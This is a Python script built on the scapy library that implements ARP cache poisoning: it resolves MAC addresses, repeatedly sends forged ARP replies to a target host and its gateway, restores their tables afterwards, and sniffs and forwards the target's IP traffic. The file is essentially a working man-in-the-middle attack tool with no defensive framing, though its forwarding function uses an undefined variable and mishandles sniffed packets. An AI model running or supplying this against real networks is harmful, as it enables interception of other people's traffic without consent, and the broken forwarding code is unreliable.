import time, colorama, sys, threading
from scapy.all import *
from scapy.config import conf

REQUIRED_FLAGS  = [ '-s', '-t', '-g' ]

DEFAULT_TIMEOUT = 1
DEFAULT_LENGTH  = 15

def GetMAC(address, timeout):
	carrier = Ether(dst="FF:FF:FF:FF:FF:FF")
	request = ARP(pdst=address)
	encapsulated = carrier / request

	answered = srp(encapsulated, timeout=timeout, verbose=False)[0]

	return answered[0][1].hwsrc if answered else None

def PrintMessage(message, code):
	colour = None
	white = colorama.Fore.WHITE

	match code:
		case 0:
			colour = colorama.Fore.GREEN
			print(f"[{colour}*{white}] {message}")
		case 1:
			colour = colorama.Fore.BLUE
			print(f"[{colour}*{white}] {message}")
		case -1:
			colour = colorama.Fore.RED
			print(f"[{colour}*{white}] {message}")
			sys.exit()

def ResetARP(targetip, gatewayip, targetmac, gatewaymac):
	for_target = ARP(op=2, psrc=gatewayip, pdst=targetip, hwsrc=gatewaymac, hwdst=targetmac)
	for_gateway = ARP(op=2, psrc=targetip, pdst=gatewayip, hwsrc=targetmac, hwdst=gatewaymac)

	send(for_target, count=1, verbose=False)
	send(for_gateway, count=1, verbose=False)

	PrintMessage((for_target, for_gateway), 0)

def SpoofARP(targetip, gatewayip, sourcemac, targetmac, gatewaymac, length):
	counter = 0
	while counter < length:
		for_target = ARP(op=2, psrc=gatewayip, pdst=targetip, hwsrc=sourcemac, hwdst=targetmac)
		for_gateway = ARP(op=2, psrc=targetip, pdst=gatewayip, hwsrc=sourcemac, hwdst=gatewaymac)

		send(for_target, count=10, verbose=False)
		send(for_gateway, count=10, verbose=False)

		PrintMessage((for_target, for_gateway), 1)

		counter += 1
		time.sleep(1)
	ResetARP(targetip, gatewayip, targetmac, gatewaymac)

def ForwardPacket(targetip, gatewayip, targetmac, gatewaymac, length):
	counter = 0
	while counter < length:
		packet = sniff(filter="ip", count=10)
		if IP in packet:
			if packet[IP].src == victim_ip or packet[IP].dst == victim_ip:
				send(packet, verbose=False)
				PrintMessage(packet.show(), 1)
		counter += 1
		time.sleep(1)
	ResetARP(targetip, gatewayip, targetmac, gatewaymac)